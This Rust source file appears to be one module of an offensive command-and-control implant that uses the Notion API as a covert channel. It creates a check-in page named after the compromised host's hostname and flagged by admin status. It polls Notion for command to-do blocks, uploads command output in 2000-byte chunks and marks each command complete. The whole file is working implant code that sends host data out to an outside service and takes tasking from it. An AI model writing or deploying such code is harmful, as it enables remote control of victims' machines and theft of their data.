use reqwest::Client;
use serde_json::json;

use crate::config::{URL_BASE, ConfigOptions};
use crate::logger::Logger;

/// This is a Noation limitation
const CHUNK_SIZE: usize = 2000;

/// Sends the result of a command back to the to-do block that made the request.
/// Notion has a per-block limit of 2000 bytes. To get around this, we split
/// the output into chunks of 2000 bytes apiece.
/// 
/// Notion still has a limit of 100 children per block, so the effective limit of
/// the output size, without multiple blocks, is 2MiB.
pub async fn send_result(client: &Client, command_block_id: &str, output: String, logger: &Logger) {
    logger.debug(format!("{output}"));
    let chunks:Vec<serde_json::Value> = output
        .as_bytes()
        .chunks(CHUNK_SIZE)
        .map(|c| json!({
            "object": "block",
            "type": "code",
            "code": {
                "text": [{
                    "type": "text",
                    "text": { "content": String::from_utf8(c.to_vec()).unwrap()},
                    "annotations": {"code": false}
                }],
                "language": "plain text"
            }
        }))
        .collect();


    let url = format!("{URL_BASE}/blocks/{command_block_id}/children");
    let body : serde_json::Value = json!({
        "children": chunks
    });
    let r = client
        .patch(url)
        .json(&body)
        .send()
        .await
        .unwrap();
    
    if !r.status().is_success() {
        let result_text = r.text().await.unwrap();
        logger.debug(result_text);
    }
}

/// Creates a new C2 page in Notion.
/// 
/// The returned value is the id of the new page, to be used with
/// `doc::get_blocks()`
pub async fn create_page(client: &Client, config_options: &ConfigOptions, hostname: String, logger: &Logger, is_admin: bool) -> Option<String> {
    logger.info(format!("Creating page..."));
    let url = format!("{}/pages/", URL_BASE);
    
    let mut check_in_emoji: String = "".to_string();

    if is_admin {
        check_in_emoji.push_str("#️⃣");
    } else {
        check_in_emoji.push_str("💲");
    }

    // Craft JSON Body
    let body: serde_json::Value = json!({
        "parent": {
            "type": "page_id",
            "page_id": config_options.parent_page_id
        },
        "icon": {
            "type": "emoji",
            "emoji": &check_in_emoji
        },
        "properties": {
            "title": [{
                "text": {
                    "content": hostname
                }
            }]
        }
    });
    let r = client
        .post(url)
        .json(&body)
        .send()
        .await
        .unwrap();
    
    if r.status().is_success() {
        let res_body = r.json::<serde_json::Value>().await.unwrap();
        return Some(String::from(res_body["id"].as_str()?));
    }
    let result_text = r.text().await.unwrap();
    logger.debug(result_text);
    None
}

/// Retrieves blocks from Notion. All children blocks of the parent page returned
/// TODO: Account for pagination for > 100 children.
pub async fn get_blocks(client: &Client, page_id: &String) -> Result<serde_json::Value, String> {
    let url = format!("{URL_BASE}/blocks/{page_id}/children");

    let r = client.get(url).send().await.unwrap();

    if r.status().is_success() {
        //println!("[*] Got blocks");
        let blocks = r.json::<serde_json::Value>().await.unwrap();
        match blocks.get("results") {
            Some(bs) => {
                //println!("{:?}", bs);
                return Ok(bs.to_owned())
            },
            None => return Ok(json!([]))
        }
    }
    Err(r.text().await.unwrap())
}

/// Marks a job done by making the to-do item checked.
pub async fn complete_command(client: &Client, mut command_block: serde_json::Value, logger: &Logger) {
    
    // Set completed status
    let block_id = command_block["id"].as_str().unwrap();
    let update_data = json!({
        "to_do": {
            "checked": true
        }
    });
    let url = format!("{URL_BASE}/blocks/{block_id}");
    let r = client
        .patch(url)
        .json(&update_data)
        .send()
        .await
        .unwrap();

    if !r.status().is_success() {
        let result_text = r.text().await.unwrap();
        logger.debug(result_text);
    }
}